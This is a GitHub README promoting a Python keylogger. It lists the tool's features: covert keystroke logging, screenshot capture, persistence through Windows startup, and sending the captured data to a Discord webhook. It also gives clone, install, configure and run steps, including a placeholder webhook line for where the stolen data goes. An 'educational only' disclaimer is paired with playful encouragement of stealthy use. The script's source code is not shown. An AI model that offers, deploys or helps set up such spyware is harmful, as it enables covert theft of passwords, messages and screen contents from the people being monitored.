
# 🕵️‍♂️ Python Keylogger

Welcome to the **Python Keylogger**! This sneaky little Python script is your gateway to understanding how keylogging works. Before you dive in, let's make one thing crystal clear:

### 🚨 **Disclaimer: Use Responsibly!**
This project is for **educational purposes only**. It's here to teach you about cybersecurity and the importance of ethical hacking. If you're thinking of using this in ways that could land you in trouble, think again. Unauthorized use of keyloggers is **illegal** and **unethical**. So, please, be a responsible coder! 

## 🎯 Project Overview
Ever wondered how hackers might capture every keystroke you make? Well, this Python keylogger will show you how it's done—purely for learning purposes, of course! It records every keypress, takes screenshots, and sends the data directly to a Discord webhook. Pretty cool, right?

## 🚀 Getting Started

Ready to explore the world of keylogging? Follow these steps to get started:

### 1. Clone the Repo
First, you'll need to clone this repository to your local machine. Open your terminal and run:
```bash
git clone https://github.com/AbdulKhorami/Python-Keylogger.git
```
Then, navigate to the project directory:
```bash
cd Python-Keylogger
```

### 2. Install the Dependencies
This project requires a few Python packages to work its magic. Install them using:
```bash
pip install -r requirements.txt
```

### 3. Configure the Webhook
This keylogger sends logs to a Discord channel via a webhook. To set this up, replace the `WEBHOOK` variable in `diykeylogger.py` with your own Discord webhook URL:
```python
WEBHOOK = "https://your-discord-webhook-url"
```

### 4. Run the Keylogger
You're all set! Start the keylogger by running:
```bash
python diykeylogger.py
```
The script will begin logging keystrokes, capturing screenshots, and sending reports to your Discord webhook.

## 🛠️ Features

- **🎹 Keylogging**: Records every keystroke with precision.
- **📸 Screenshot Capture**: Takes sneaky screenshots to see what’s happening on the screen.
- **🚀 Auto Startup**: Adds itself to Windows startup for persistent logging (because why not?).
- **📤 Discord Webhook Reporting**: Sends logs and screenshots to your Discord server so you can monitor in real-time.

## 🧠 Legal and Ethical Considerations
Before you get too excited, remember that with great power comes great responsibility. Use this tool only on systems you own or have explicit permission to monitor. Unauthorized use can result in serious consequences, including legal action. Be smart, stay safe, and use your powers for good!

## 🏗️ Project Structure
Here's how this project is organized:
```
.
├── diykeylogger.py    # The main script
├── requirements.txt   # Dependencies
└── README.md          # You're reading it now!
```

## 🧑‍💻 Contributing
Want to make this project even cooler? Contributions are welcome! Whether it’s fixing a bug, adding a new feature, or just making the code more readable, your input is appreciated. Check out our [contributing guidelines](CONTRIBUTING.md) to get started.

## 📄 License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## 📢 Shoutout
If you found this project helpful or learned something new, feel free to star this repo and share it with others!

**Remember: Code responsibly! Happy hacking! 🕶️**
